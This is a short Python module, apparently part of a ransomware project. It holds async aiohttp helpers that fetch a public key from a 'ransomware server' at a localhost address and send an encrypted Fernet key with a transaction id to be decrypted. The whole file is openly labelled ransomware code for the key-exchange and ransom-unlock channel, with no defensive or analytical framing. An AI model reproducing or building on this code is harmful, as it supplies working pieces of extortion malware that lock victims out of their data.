from aiohttp import ClientSession

RANSOMWARE_SERVER_URL='http://127.0.0.1:443'

async def request_fernet_decryption(fernet_key, transation_id):
    fernet = await __post(f'{RANSOMWARE_SERVER_URL}/{transation_id}', data=fernet_key)
    return fernet

#ben
async def request_server_public_key():
    server_public_key = await __get(f'{RANSOMWARE_SERVER_URL}/getPublicKey')
    return server_public_key

async def __post(url, json=None, data=None):
    async with ClientSession() as session:
        return await __request(session.post, url, json, data)

async def __get(url, json=None, data=None):
    async with ClientSession() as session:
        return await __request(session.get, url, json, data)

async def __request(action, url, json, data):
    async with action(url, json=json, data=data) as response:
        return await response.json()